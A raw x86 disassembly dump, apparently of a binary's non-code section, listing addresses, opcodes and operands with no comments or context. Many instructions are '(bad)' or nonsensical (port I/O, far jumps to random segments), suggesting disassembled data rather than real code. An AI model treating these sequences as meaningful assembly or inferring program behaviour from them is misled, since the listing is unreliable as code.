  41770c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41770d:	cli    
  41770e:	stc    
  41770f:	cmp    edx,DWORD PTR [eax-0x13]
  417712:	mov    WORD PTR [esi-0x58c020d9],?
  417718:	stos   BYTE PTR es:[edi],al
  417719:	pop    esp
  41771a:	xchg   esp,eax
  41771b:	ja     0x4176c5
  41771d:	aad    0x38
  41771f:	pop    eax
  417720:	sbb    ebx,DWORD PTR [ecx-0x2fd80d41]
  417726:	lods   al,BYTE PTR ds:[esi]
  417727:	das    
  417728:	lock pop DWORD PTR [ecx+0x59]
  41772c:	mov    eax,0xd2ca5dec
  417731:	test   eax,0x969b26
	...
  417796:	jmp    0xff5975a9
  41779b:	imul   ecx
  41779d:	(bad)  
  41779e:	mov    bh,0x89
  4177a0:	jmp    0x4177bb
  4177a2:	jmp    0x417747
  4177a4:	pop    esi
  4177a5:	call   0x426da1
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    BYTE PTR [ecx+0x5a],bh
  4177b0:	(bad)  
  4177b1:	jo     0x417775
  4177b3:	(bad)  
  4177b4:	icebp  
  4177b5:	sbb    BYTE PTR [edi],ah
  4177b7:	lock lea edi,[edx-0x61015fb4]
  4177be:	loopne 0x417787
  4177c0:	aas    
  4177c1:	das    
  4177c2:	push   edx
  4177c3:	loope  0x41778e
  4177c5:	xchg   ebx,eax
  4177c6:	rcl    BYTE PTR [edi-0x1c56dbe0],cl
  4177cc:	das    
  4177cd:	jmp    0x417843
  4177cf:	popf   
  4177d0:	cmc    
  4177d1:	mov    esp,0xca410d71
  4177d6:	popa   
  4177d7:	popf   
  4177d8:	mov    al,0xf
  4177da:	mov    dh,0x84
  4177dc:	add    eax,0xc8a79feb
  4177e1:	nop
  4177e2:	push   esp
  4177e3:	je     0x417848
  4177e5:	ficomp WORD PTR [eax+0x6a81c413]
  4177eb:	psubq  mm4,QWORD PTR [edi]
  4177ee:	ret    0x1ebc
  4177f1:	in     al,0x12
  4177f3:	(bad)  
  4177f4:	xchg   ecx,eax
  4177f5:	jp     0x4177b0
  4177f7:	inc    ebp
  4177f8:	adc    al,0xc1
  4177fa:	(bad)  
  4177fc:	push   es
  4177fd:	xor    DWORD PTR [eax-0x35],esp
  417800:	ss pop ebx
  417802:	lahf   
  417803:	or     eax,0x8bae0db3
  417808:	xchg   ebp,eax
  417809:	jmp    0xf9df608b
  41780e:	xor    eax,0xa7b9a0cd
  417813:	retf   
  417814:	jecxz  0x4177fb
  417816:	test   al,0x29
  417818:	xchg   cx,ax
  41781a:	mov    ch,0x4
  41781c:	pop    esp
  41781d:	ror    DWORD PTR [edx+0x76472e81],1
  417823:	daa    
  417824:	loop   0x417836
  417826:	dec    esi
  417827:	clc    
  417828:	mov    al,ds:0x30759bd3
  41782d:	dec    esi
  41782e:	push   esi
  41782f:	inc    edi
  417830:	es sti 
  417832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417833:	sbb    ch,dh
  417835:	in     al,dx
  417836:	push   es
  417837:	inc    eax
  417838:	movsx  esi,WORD PTR [edx]
  41783b:	adc    BYTE PTR ds:0x75c574d8,dl
  417841:	jns    0x4177d1
  417843:	pop    esi
  417844:	stos   BYTE PTR es:[edi],al
  417845:	fwait
  417846:	jbe    0x417834
  417848:	test   al,0xad
  41784a:	mov    esp,DWORD PTR [esi]
  41784c:	push   esp
  41784d:	dec    ebx
  41784e:	mov    bl,0x8f
  417850:	jle    0x41783a
  417852:	daa    
  417853:	inc    eax
  417854:	lds    ecx,FWORD PTR [ebx+0x7ba5b703]
  41785a:	and    BYTE PTR [edi+0x52],dh
  41785d:	adc    ah,bl
  41785f:	sbb    eax,0x998d5da5
  417864:	mov    edx,0x607e33ee
  417869:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41786b:	sbb    DWORD PTR [ebp-0x667f29fb],0x7e
  417872:	(bad)  
  417873:	push   edx
  417874:	and    al,BYTE PTR [eax-0x38]
  417877:	cmp    al,0x8e
  417879:	(bad)  [edx+0x43e2a5a6]
  41787f:	cs (bad) 
  417881:	outs   dx,DWORD PTR ds:[esi]
  417882:	mov    eax,0x6274c97b
  417887:	xor    eax,0xa0a3d89d
  41788c:	in     al,0xcf
  41788e:	mov    ebp,ecx
  417890:	call   0x764ccc28
  417895:	retf   
  417896:	stc    
  417897:	sub    DWORD PTR [edx+0x1a],ebx
  41789a:	aaa    
  41789b:	sub    ebp,ecx
  41789d:	cmp    ebp,0x1f41e304
  4178a3:	inc    ebp
  4178a4:	push   ds
  4178a5:	push   edi
  4178a6:	cmc    
  4178a7:	test   al,0xe1
  4178a9:	test   BYTE PTR [ebx-0x17],cl
  4178ac:	(bad)  
  4178ad:	fwait
  4178ae:	in     al,0xf2
  4178b0:	push   edi
  4178b1:	adc    al,0x31
  4178b3:	push   ss
  4178b4:	popa   
	...
  417915:	add    BYTE PTR [eax+0x41],bl
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0x9460e3bb
  417923:	mov    ds:0xf6fef853,eax
  417928:	add    BYTE PTR [eax],al
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [edx],ch
  41792f:	cdq    
  417930:	cmp    al,0x92
  417932:	arpl   WORD PTR [eax],ax
  417934:	adc    esp,esi
  417936:	cmp    ebp,DWORD PTR cs:[edx+0x15ed6d2f]
  41793d:	xchg   ecx,eax
  41793e:	mov    ebp,ss
  417940:	fnstenv [esp+ebx*4]
  417943:	cdq    
  417944:	push   eax
  417945:	icebp  
  417946:	xor    al,0xf4
  417948:	dec    esp
  417949:	or     DWORD PTR [edi-0x29],ebp
  41794c:	ret    
  41794d:	and    eax,0xcf1cfe63
  417952:	add    al,0x5d
  417954:	sbb    eax,0x7f5dda04
  417959:	arpl   WORD PTR [ebp-0x482314e7],si
  41795f:	fild   WORD PTR [edi+0x4ff36f07]
  417965:	and    DWORD PTR [ecx],esp
  417967:	lahf   
  417968:	cwde   
  417969:	mov    ebx,0x61c7b063
  41796e:	mov    ecx,0x12a636e2
  417973:	sub    al,0x7
  417975:	call   DWORD PTR [eax+0x5104060d]
  41797b:	cdq    
  41797c:	jnp    0x41793c
  41797e:	cmp    eax,eax
  417980:	stc    
  417981:	or     esp,DWORD PTR [ecx*8+0x4c34741e]
  417988:	rcl    esi,cl
  41798a:	push   esi
  41798b:	stc    
  41798c:	xchg   DWORD PTR [ecx],esp
  41798e:	xor    al,0xb5
  417990:	adc    DWORD PTR [ebx+0x37],esi
  417993:	mov    esi,0xd00980eb
  417998:	inc    ebx
  417999:	cmp    eax,0xd8b490c3
  41799e:	jbe    0x4179f5
  4179a0:	adc    BYTE PTR ds:0x3d19889a,cl
  4179a6:	add    al,0x0
  4179a8:	mov    bh,0x7
  4179aa:	xor    eax,edx
  4179ac:	pop    ds
  4179ad:	mov    esi,0xda3eb67f
  4179b2:	fdivp  st(7),st
  4179b4:	outs   dx,DWORD PTR ds:[esi]
  4179b5:	into   
  4179b6:	call   0x9ae3b19b
  4179bb:	stos   BYTE PTR es:[edi],al
  4179bc:	dec    esi
  4179bd:	mov    esi,0xefb84384
  4179c2:	mov    cl,0xac
  4179c4:	fisubr WORD PTR [edx+eiz*2+0x68]
  4179c8:	sbb    ecx,esp
  4179ca:	mov    dl,0x41
  4179cc:	push   esp
  4179cd:	in     al,0x7c
  4179cf:	xor    al,0xb7
  4179d1:	repz xor al,0xcf
  4179d4:	jns    0x417966
  4179d6:	inc    ecx
  4179d7:	pop    eax
  4179d8:	sbb    al,0xf7
  4179da:	das    
  4179db:	mov    ch,0x8c
  4179dd:	in     al,dx
  4179de:	pop    ebp
  4179df:	lock jmp 0xb4c0:0xf2ff8277
  4179e7:	mov    ecx,0x2ab8008f
  4179ec:	cmp    BYTE PTR [ecx-0x2a],dl
  4179ef:	shl    esi,1
  4179f1:	lds    esp,FWORD PTR [edi-0x68]
  4179f4:	adc    BYTE PTR [eax+0x38eafe6f],ch
  4179fa:	jae    0x4179f1
  4179fc:	shl    eax,cl
  4179fe:	mov    eax,0x2903ed9
  417a03:	mov    ch,0xf8
  417a05:	mov    al,0x9d
  417a07:	mov    ebx,DWORD PTR [bp+si]
  417a0a:	dec    ecx
  417a0b:	mov    esp,0x70c59892
  417a10:	fdivr  st,st(0)
  417a12:	loop   0x417a71
  417a14:	iret   
  417a15:	xor    al,0x54
  417a17:	bound  esp,QWORD PTR [ebp+0x763abd11]
  417a1d:	jne    0x417a72
  417a1f:	aad    0x7e
  417a21:	push   ebp
  417a22:	inc    edi
  417a23:	xor    DWORD PTR [edx+edi*1],esp
  417a26:	and    al,0x53
  417a28:	aaa    
  417a29:	test   DWORD PTR [ebp+0x29],ebp
  417a2c:	push   0x478736b1
  417a31:	in     al,0x27
  417a33:	push   0xac
	...
  417a94:	add    BYTE PTR [eax],al
  417a96:	das    
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx-0x3]
  417aa3:	xchg   ebp,eax
  417aa4:	mov    bl,0x96
  417aa6:	add    eax,0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    BYTE PTR [ebx],ch
  417aaf:	repnz inc edx
  417ab1:	dec    ebp
  417ab2:	sbb    al,0x37
  417ab4:	xor    eax,edx
  417ab6:	xor    bl,bl
  417ab8:	push   ebx
  417ab9:	cs in  eax,0x87
  417abc:	lods   eax,DWORD PTR ds:[esi]
  417abd:	push   ss
  417abe:	(bad)  
  417abf:	in     al,dx
  417ac0:	pop    ss
  417ac1:	add    esi,0xc9a2969b
  417ac7:	sahf   
  417ac8:	sub    ch,BYTE PTR [ebp-0x4e]
  417acb:	xor    esi,DWORD PTR [edx+0x3d]
  417ace:	push   eax
  417acf:	cmp    dl,BYTE PTR [eax+0x7f]
  417ad2:	mov    ah,0xbc
  417ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ad5:	or     BYTE PTR fs:[edx-0xa],dh
  417ad9:	sbb    al,0xb1
  417adb:	mov    ch,0x9b
  417add:	and    DWORD PTR [edx],eax
  417adf:	mov    ah,0x84
  417ae1:	bnd call 0xabae39c2
  417ae7:	jl     0x417b38
  417ae9:	int    0x4
  417aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aec:	jmp    0x417ac2
  417aee:	or     bl,bh
  417af0:	jb     0x417acb
  417af2:	pop    esp
  417af3:	imul   ebx,DWORD PTR [edx-0x2a3de922],0x4b
  417afa:	or     al,0x75
  417afc:	add    BYTE PTR [ecx+ebp*4],ch
  417aff:	mov    ebx,DWORD PTR [esi-0x5c]
  417b02:	xor    al,0x87
  417b04:	adc    dl,ah
  417b06:	clc    
  417b07:	int    0xe8
  417b09:	pop    edi
  417b0a:	xchg   edx,eax
  417b0b:	sbb    al,0x6f
  417b0d:	out    dx,eax
  417b0e:	jp     0x417ae9
  417b10:	lods   eax,DWORD PTR ds:[esi]
  417b11:	jae    0x417b66
  417b13:	and    eax,0x1eb6c61a
  417b18:	and    al,0xd1
  417b1a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  417b1c:	sahf   
  417b1d:	in     eax,dx
  417b1e:	xchg   edi,eax
  417b1f:	sub    eax,0x80f93f7e
  417b24:	push   ss
  417b25:	push   cs
  417b26:	leave  
  417b27:	retf   
  417b28:	out    0xaa,al
  417b2a:	push   edi
  417b2b:	mov    ch,0x98
  417b2d:	rcr    BYTE PTR [eax-0x12],cl
  417b30:	mov    bl,0xa2
  417b32:	pop    es
  417b33:	test   esp,ebx
  417b35:	lods   eax,DWORD PTR ds:[esi]
  417b36:	push   ecx
  417b37:	push   es
  417b38:	sub    eax,0x4280e693
  417b3d:	dec    ebx
  417b3e:	bound  edi,QWORD PTR [ebx]
  417b40:	push   ebp
  417b41:	and    eax,0xdeabf93f
  417b46:	push   eax
  417b47:	pusha  
  417b48:	(bad)  
  417b49:	aas    
  417b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b4b:	and    al,BYTE PTR [eax-0x10]
  417b4e:	sub    BYTE PTR [ebx+0x3a5a6f73],bh
  417b54:	mov    cx,0xf4d3
  417b58:	or     al,0x3
  417b5a:	sar    dh,0xea
  417b5d:	sub    DWORD PTR [edi],ebx
  417b5f:	(bad)  
  417b60:	mov    esp,0x1a0e3535
  417b65:	call   0x3923fc04
  417b6a:	adc    eax,0x42fc2149
  417b6f:	sub    dh,cl
  417b71:	mov    dl,al
  417b73:	pushf  
  417b74:	sub    cl,ch
  417b76:	fld    DWORD PTR [edi-0x4f]
  417b79:	mov    cl,0xdf
  417b7b:	xor    al,bl
  417b7d:	pusha  
  417b7e:	push   eax
  417b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b80:	adc    dh,BYTE PTR [edx]
  417b82:	sub    BYTE PTR [edx],al
  417b84:	lods   eax,DWORD PTR ds:[esi]
  417b85:	jne    0x417b7a
  417b87:	mov    esp,0xe5eb2f0e
  417b8c:	mov    ds:0xfcc5b0d4,al
  417b91:	ins    BYTE PTR es:[edi],dx
  417b92:	dec    ecx
  417b93:	sbb    al,0xe9
  417b95:	pop    ss
  417b96:	idiv   DWORD PTR [esi-0x57]
  417b99:	(bad)  
  417b9a:	mov    bl,0xfb
  417b9c:	pop    ss
  417b9d:	dec    edi
  417b9e:	xor    eax,ecx
  417ba0:	or     DWORD PTR [ecx+ebx*8+0x77],edi
  417ba4:	mov    ch,0x3c
  417ba6:	(bad)  
  417ba7:	xor    dh,BYTE PTR [eax-0x5d]
  417baa:	fidivr DWORD PTR [edx-0x53a18959]
  417bb0:	mov    ecx,0x8a9c5c8f
	...
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0xc7
  417c23:	xchg   edx,eax
  417c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c26:	or     al,0xf9
  417c28:	add    BYTE PTR [eax],al
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    dl,ch
  417c2f:	jno    0x417c4c
  417c31:	loop   0x417c3d
  417c33:	dec    esp
  417c34:	and    esp,eax
  417c36:	pop    ss
  417c37:	cmp    ecx,edx
  417c39:	imul   edx,DWORD PTR [esi+0xb4e8f42],0x3f
  417c40:	pop    ss
  417c41:	mov    bl,0xa9
  417c43:	xor    BYTE PTR [ebp+0x4b],bh
  417c46:	pop    edx
  417c47:	add    eax,DWORD PTR [edx-0x61]
  417c4a:	or     al,0x82
  417c4c:	sub    DWORD PTR [ebp+0x33],ebp
  417c4f:	sbb    BYTE PTR [edi+ecx*8],dl
  417c52:	out    0x0,eax
  417c54:	lahf   
  417c55:	or     eax,0x6f226eef
  417c5a:	jmp    0x417c6f
  417c5c:	or     DWORD PTR [ebx+0xa2bac63],ecx
  417c62:	retf   
  417c63:	test   BYTE PTR [eax+edx*4+0x2611dbe],cl
  417c6a:	inc    DWORD PTR [eax+0x4e]
  417c6d:	imul   DWORD PTR [esi]
  417c6f:	pushf  
  417c70:	jmp    0x417c0f
  417c72:	xor    ebx,edi
  417c74:	imul   ecx,ebp,0x76
  417c77:	loopne 0x417c94
  417c79:	pop    ebx
  417c7a:	es sbb eax,0x1005a7de
  417c80:	rcl    BYTE PTR [eax],1
  417c82:	and    esi,eax
  417c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c85:	sbb    BYTE PTR [ebx],dh
  417c87:	nop
  417c88:	xchg   esp,eax
  417c89:	xchg   esp,eax
  417c8a:	xchg   ecx,eax
  417c8b:	xor    edx,DWORD PTR [esi+0x74b3cea5]
  417c91:	js     0x417cca
  417c93:	enter  0xab14,0xd4
  417c97:	inc    ebp
  417c98:	xor    DWORD PTR [ecx],esp
  417c9a:	cmp    DWORD PTR [edx+0xd],esi
  417c9d:	jne    0x417cdf
  417c9f:	mov    ebp,0x477324ad
  417ca4:	loopne 0x417c65
  417ca6:	pop    ds
  417ca7:	xchg   DWORD PTR [ebp+0x45],edi
  417caa:	push   0xffffffac
  417cac:	mov    al,ds:0x308867bd
  417cb1:	ds aam 0xad
  417cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cb5:	push   edi
  417cb6:	inc    esp
  417cb7:	ss cwde 
  417cb9:	add    DWORD PTR [eax],ebx
  417cbb:	aam    0xc6
  417cbd:	cmp    DWORD PTR [ecx],0x5d967337
  417cc3:	lods   eax,DWORD PTR ds:[esi]
  417cc4:	mov    edi,0xa34c6b2f
  417cc9:	dec    esp
  417cca:	mov    al,0x67
  417ccc:	push   eax
  417ccd:	icebp  
  417cce:	pop    ebp
  417ccf:	dec    esp
  417cd0:	fstp   QWORD PTR [eax]
  417cd2:	xchg   ebx,eax
  417cd3:	popf   
  417cd4:	xchg   ebp,eax
  417cd5:	popa   
  417cd6:	dec    ecx
  417cd7:	ins    DWORD PTR es:[edi],dx
  417cd8:	jl     0x417d50
  417cda:	inc    esi
  417cdb:	leave  
  417cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cdd:	jae    0x417cc9
  417cdf:	in     eax,dx
  417ce0:	cmp    DWORD PTR [edi+0x104ea69d],eax
  417ce6:	aas    
  417ce7:	(bad)  
  417ce8:	sub    cl,BYTE PTR [ecx-0x3a]
  417ceb:	push   edi
  417cec:	and    dl,BYTE PTR ss:[eax+0x21b54214]
  417cf3:	das    
  417cf4:	pop    eax
  417cf5:	cmp    BYTE PTR [esi+0x42],bh
  417cf8:	jecxz  0x417d34
  417cfa:	and    DWORD PTR [eax+0xa],edi
  417cfd:	sbb    BYTE PTR [edx-0x67],ch
  417d00:	enter  0xc85a,0xe0
  417d04:	rcr    ecx,0xcd
  417d07:	or     dl,BYTE PTR [edx]
  417d09:	dec    esi
  417d0a:	ret    
  417d0b:	fsubr  QWORD PTR [esi-0x18741d3]
  417d11:	xor    BYTE PTR [ebx],bh
  417d13:	je     0x417c9d
  417d15:	jge    0x417caa
  417d17:	cli    
  417d18:	mov    ebx,0x9998878a
  417d1d:	popa   
  417d1e:	je     0x417d9e
  417d20:	out    0x25,eax
  417d22:	mov    bh,0xcd
  417d24:	popf   
  417d25:	xor    BYTE PTR [ecx+0x16b8eb2b],al
  417d2b:	loop   0x417d11
  417d2d:	mov    bh,0x1c
  417d2f:	inc    edi
  417d30:	je     0x417d63
  417d32:	mov    ds:0xf7d1,eax
	...
  417d93:	add    BYTE PTR [eax],al
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0xb2
  417da3:	dec    esi
  417da4:	outs   dx,DWORD PTR ds:[esi]
  417da5:	dec    ecx
  417da6:	adc    edi,edx
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    bh,bh
  417daf:	sbb    eax,DWORD PTR [eax]
  417db1:	push   edi
  417db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417db3:	aas    
  417db4:	xchg   ebx,eax
  417db5:	push   eax
  417db6:	fdiv   DWORD PTR [ecx]
  417db8:	ja     0x417de9
  417dba:	das    
  417dbb:	not    ecx
  417dbd:	xchg   BYTE PTR [ebp+0x8],bh
  417dc0:	retf   
  417dc1:	sbb    DWORD PTR [eax-0x5e],ebx
  417dc4:	xchg   edx,eax
  417dc5:	adc    bh,cl
  417dc7:	adc    ebp,DWORD PTR [ebx+edi*1+0x21]
  417dcb:	ja     0x417e22
  417dcd:	dec    edi
  417dce:	(bad)  
  417dcf:	mov    ds:0x75415cd4,al
  417dd4:	add    al,0xe8
  417dd6:	call   0x6b2c:0xcd010b6a
  417ddd:	js     0x417dc0
  417ddf:	daa    
  417de0:	jns    0x417dd5
  417de2:	loop   0x417d70
  417de4:	mov    ds:0x92bfbb17,eax
  417de9:	ret    
  417dea:	add    al,0x38
  417dec:	sbb    al,0xd1
  417dee:	call   0xf4c1:0xca853d15
  417df5:	lods   eax,DWORD PTR ds:[esi]
  417df6:	inc    esi
  417df7:	jmp    0x1598:0xa4ca9ad7
  417dfe:	loope  0x417e7c
  417e00:	lds    edi,FWORD PTR gs:[edi-0x33]
  417e04:	popf   
  417e05:	into   
  417e06:	mov    dh,0xb3
  417e08:	sbb    DWORD PTR [eax+0x54e718af],ebp
  417e0e:	ss dec edx
  417e10:	add    esp,DWORD PTR ss:[ecx]
  417e13:	inc    edx
  417e14:	cmp    edx,ecx
  417e16:	and    ebx,ebx
  417e18:	test   eax,ebx
  417e1a:	inc    esi
  417e1b:	pop    ecx
  417e1c:	sbb    DWORD PTR [ebx+0x54f11d01],ebp
  417e22:	cld    
  417e23:	mov    ebp,0x273e702a
  417e28:	fs rcr DWORD PTR ss:[ecx-0x23eb09f8],1
  417e30:	xchg   ebx,eax
  417e31:	xchg   BYTE PTR [edx+0x1a],bl
  417e34:	mov    gs,ebx
  417e36:	mov    ch,0x4b
  417e38:	fcomp  DWORD PTR [eax+0x3594bf20]
  417e3e:	jmp    0x6f5d:0x84cefb03
  417e45:	sahf   
  417e46:	(bad)  
  417e48:	stos   DWORD PTR es:[edi],eax
  417e49:	sbb    DWORD PTR [edi],ecx
  417e4b:	sysenter 
  417e4d:	xchg   ebx,eax
  417e4e:	ja     0x417e00
  417e50:	lods   eax,DWORD PTR ds:[esi]
  417e51:	retf   
  417e52:	add    BYTE PTR [edx-0x75],bh
  417e55:	popf   
  417e56:	push   edx
  417e57:	xchg   ebx,eax
  417e58:	pusha  
  417e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e5a:	inc    eax
  417e5b:	ss lock jns 0x417e33
  417e5f:	stos   DWORD PTR es:[edi],eax
  417e60:	test   eax,0x4b7afe8c
  417e65:	out    dx,eax
  417e66:	leave  
  417e67:	xor    al,0x5c
  417e69:	or     al,0x1f
  417e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e6c:	mov    ebx,0xe47e0b60
  417e71:	push   0xffffffbf
  417e73:	mov    edi,0x87eeefae
  417e78:	mov    cl,0x79
  417e7a:	pop    ds
  417e7b:	jge    0x417e1f
  417e7d:	sub    DWORD PTR ds:0x25e8b1b6,ebx
  417e83:	rcl    DWORD PTR [edx],1
  417e85:	pop    ecx
  417e86:	in     eax,0xe4
  417e88:	mov    eax,ds:0xa43df527
  417e8d:	mov    al,ds:0xb67a26b6
  417e92:	(bad)  
  417e93:	popf   
  417e94:	jmp    0xa1b9a188
  417e99:	sub    DWORD PTR [esi],0x10964e21
  417e9f:	test   bl,bh
  417ea1:	or     ah,BYTE PTR [ebp-0x7420bb8d]
  417ea7:	lock dec si
  417eaa:	dec    edi
  417eab:	mov    ah,0x10
  417ead:	pop    eax
  417eae:	lods   eax,DWORD PTR ds:[esi]
  417eaf:	sbb    BYTE PTR [eax-0x66],dh
  417eb2:	out    dx,al
  417eb3:	adc    al,0x68
	...
  417f15:	add    BYTE PTR [edx-0x1a],ah
  417f18:	out    0x3b,al
  417f1a:	out    0x3b,al
  417f1c:	(bad)  
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	shr    ah,cl
  417f24:	ins    DWORD PTR es:[edi],dx
  417f25:	fs sbb bh,bl
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    BYTE PTR [eax-0x50c0f34d],dh
  417f33:	ja     0x417f05
  417f35:	(bad)  
  417f36:	leave  
  417f37:	(bad)  
  417f38:	or     al,0x41
  417f3a:	sbb    ch,BYTE PTR [edi+0x73]
  417f3d:	adc    DWORD PTR [edi-0x50],ebx
  417f40:	das    
  417f41:	dec    ebx
  417f42:	loop   0x417f8b
  417f44:	ret    
  417f45:	stos   BYTE PTR es:[edi],al
  417f46:	xchg   ch,al
  417f48:	fwait
  417f49:	bound  esi,QWORD PTR [ecx-0x6]
  417f4c:	(bad)  
  417f4d:	int3   
  417f4e:	cmp    eax,0x64036a61
  417f53:	data16 and ah,BYTE PTR [eax-0x5f5c0aa0]
  417f5a:	out    0xb6,al
  417f5c:	dec    esp
  417f5d:	mov    ecx,0x2ae4b2b6
  417f62:	cmp    dh,dh
  417f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f65:	jmp    eax
  417f67:	outs   dx,BYTE PTR ds:[esi]
  417f68:	or     esp,DWORD PTR [ecx-0x20]
  417f6b:	pop    ebx
  417f6c:	xchg   edi,eax
  417f6d:	loopne 0x417f09
  417f6f:	fisub  DWORD PTR [ebx-0xf62aacc]
  417f75:	test   DWORD PTR [ebx],ebx
  417f77:	rcr    DWORD PTR [edx-0x5c705351],1
  417f7d:	daa    
  417f7e:	push   eax
  417f7f:	fistp  WORD PTR [esi-0xf]
  417f82:	pusha  
  417f83:	sub    dh,BYTE PTR [esi+0x6b28814c]
  417f89:	sub    eax,0x258a0ceb
  417f8e:	mov    esp,0x84a57af9
  417f93:	mov    bl,0xc7
  417f95:	imul   eax,DWORD PTR [eax],0xe72118b6
  417f9b:	jl     0x417f23
  417f9d:	mov    esi,0x51475c9f
  417fa2:	sub    BYTE PTR [ecx-0x72d12584],dl
  417fa8:	and    ch,bh
  417faa:	mov    edx,0x622c9b8c
  417faf:	mov    esi,0xefddaa7f
  417fb4:	sbb    edi,eax
  417fb6:	mov    eax,ds:0x6d90b558
  417fbb:	rcr    BYTE PTR [edi+ebp*4],0xeb
  417fbf:	loop   0x418018
  417fc1:	xor    ch,dh
  417fc3:	sbb    al,0xf5
  417fc5:	adc    eax,0x681546ef
  417fca:	add    bl,BYTE PTR [ebx]
  417fcc:	pop    esi
  417fcd:	jmp    0x7f6075b
  417fd2:	pop    ebx
  417fd3:	pop    edi
  417fd4:	mov    ah,0x7
  417fd6:	xchg   esi,eax
  417fd7:	push   es
  417fd8:	fcmovne st,st(0)
  417fda:	inc    ebp
  417fdb:	fwait
  417fdc:	dec    esp
  417fdd:	int3   
  417fde:	add    edi,DWORD PTR [ebp+0x33]
  417fe1:	test   BYTE PTR [eax+edi*4-0x257944fd],ch
  417fe8:	clc    
  417fe9:	mov    eax,0x192112c
  417fef:	mov    cl,bh
  417ff1:	cmp    BYTE PTR [eax+0x35],dl
  417ff4:	outs   dx,BYTE PTR ds:[esi]
  417ff5:	call   0x73e:0x7890634f
  417ffc:	add    eax,0x58ff2907
  418001:	call   ecx
  418003:	pop    ds
  418004:	mov    bh,0xd0
  418006:	aas    
  418007:	sub    ch,BYTE PTR [esi-0x73455c89]
  41800d:	add    DWORD PTR [edi-0x63],0x9d1e3f49
  418014:	rcr    DWORD PTR [eax+eiz*2+0x7419caea],1
  41801b:	xor    bl,BYTE PTR [ebx-0x5c7b4c41]
  418021:	push   cs
  418022:	shl    BYTE PTR [ebx-0x40],0xbe
  418026:	mov    ebx,0x94cd46c9
  41802b:	xor    al,0x4e
  41802d:	inc    edi
  41802e:	not    DWORD PTR [edx-0x2624c6ed]
  418034:	mov    ebx,0x0
	...
  418095:	add    BYTE PTR [ecx-0xba9482],ch
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx+0x63bb98c4]
  4180a3:	ins    DWORD PTR es:[edi],dx
  4180a4:	mov    esp,0xfc2149
  4180a9:	add    BYTE PTR [edi],al
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    ch,ah
  4180af:	imul   ebp,ecx,0xbc9f16a5
  4180b5:	add    dh,BYTE PTR ds:0x7c48aab8
  4180bb:	jge    0x418044
  4180bd:	mov    DWORD PTR [eax],esi
  4180bf:	pop    esp
  4180c0:	daa    
  4180c1:	cld    
  4180c2:	mov    esi,0xd7b37190
  4180c7:	ror    DWORD PTR [eax],cl
  4180c9:	fmul   QWORD PTR [edi+0x7d]
  4180cc:	neg    BYTE PTR [ecx]
  4180ce:	lahf   
  4180cf:	lahf   
  4180d0:	push   ecx
  4180d1:	test   eax,0xbc28b24c
  4180d6:	sub    BYTE PTR [edi+0x7d],dl
  4180d9:	adc    ah,cl
  4180db:	aad    0x67
  4180dd:	outs   dx,DWORD PTR ds:[esi]
  4180de:	imul   ebp,DWORD PTR [edi+0x7],0x27
  4180e2:	mov    edx,0x8987df67
  4180e7:	fadd   QWORD PTR [di-0x4e8]
  4180ec:	out    dx,al
  4180ed:	ins    DWORD PTR es:[edi],dx
  4180ee:	(bad)  
  4180ef:	jmp    0x4180d1
  4180f1:	out    0xf,al
  4180f3:	mov    eax,0x246338bb
  4180f8:	push   esi
  4180f9:	cs je  0x41813f
  4180fc:	cmp    BYTE PTR [ebp-0x2c89fcc1],0x86
  418103:	lahf   
  418104:	push   edx
  418105:	jmp    0xd3508105
  41810a:	mov    ebp,0xcc83d9b7
  41810f:	into   
  418110:	repnz (bad) 
  418112:	jg     0x418193
  418114:	inc    edx
  418115:	sbb    BYTE PTR [esi-0x4fae496c],dh
  41811b:	jmp    0x418172
  41811d:	out    dx,eax
  41811e:	push   ebp
  41811f:	ds jp  0x418188
  418122:	shl    DWORD PTR [ecx],cl
  418124:	fist   DWORD PTR [ebx]
  418126:	loopne 0x4180ed
  418128:	mov    ecx,0xca2ee607
